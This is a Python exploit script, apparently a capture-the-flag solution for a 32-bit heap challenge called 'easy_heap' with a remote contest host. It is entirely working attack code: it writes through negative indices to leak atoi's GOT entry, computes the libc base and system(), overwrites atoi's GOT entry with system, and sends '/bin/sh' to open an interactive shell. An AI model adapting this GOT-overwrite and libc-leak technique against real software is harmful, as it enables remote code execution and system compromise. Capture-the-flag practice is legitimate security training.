from pwnxx import *

#context(os='linux', arch='i386')
#context.log_level = 'debug'

BINARY = './easy_heap'
elf  = ELF(BINARY)

atoi_got_addr = elf.got['atoi']

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  s = remote("easyheap.acebear.site", 3002)
  libc = ELF("./easyheap_libc.so.6")
else:
  s = process(BINARY)
  libc = elf.libc
  gdb.attach(s,"b*0x080489f6")

def Create(index, name):
  s.recvuntil("Your choice: ")
  s.sendline("1")
  s.recvuntil("Index: ")
  s.sendline(str(index))
  s.recvuntil("Input this name: ")
  s.sendline(name)

def Edit(index, name):
  s.recvuntil("Your choice: ")
  s.sendline("2")
  s.recvuntil("Index: ")
  s.sendline(str(index))
  s.recvuntil("Input new name: ")
  s.send(name)

def Delete(index):
  s.recvuntil("Your choice: ")
  s.sendline("3")
  s.recvuntil("Index: ")
  s.sendline(str(index))

def Show(index):
  s.recvuntil("Your choice: ")
  s.sendline("4")
  s.recvuntil("Index: ")
  s.sendline(str(index))

s.recvuntil("Give me your name: ")
s.sendline("1111")
s.recvuntil("Your age: ")
s.sendline("2222")

raw_input("111111111111111111111111111111")
Create(1, "AAAA")
Delete(1)

Edit(-72, p32(atoi_got_addr))
Show(-40)
r = s.recv(0x1c)
atoi_addr = u32(r[0x12:0x16])
libc_base_addr = atoi_addr - libc.symbols['atoi']
system_addr    = libc_base_addr + libc.symbols['system']

print "atoi_addr      =", hex(atoi_addr)
print "libc_base_addr =", hex(libc_base_addr)
print "system_addr    =", hex(system_addr)

Edit(-72, p32(atoi_got_addr))
Edit(-40, p32(system_addr))

s.recvuntil("Your choice: ")
s.sendline("/bin/sh")

s.interactive()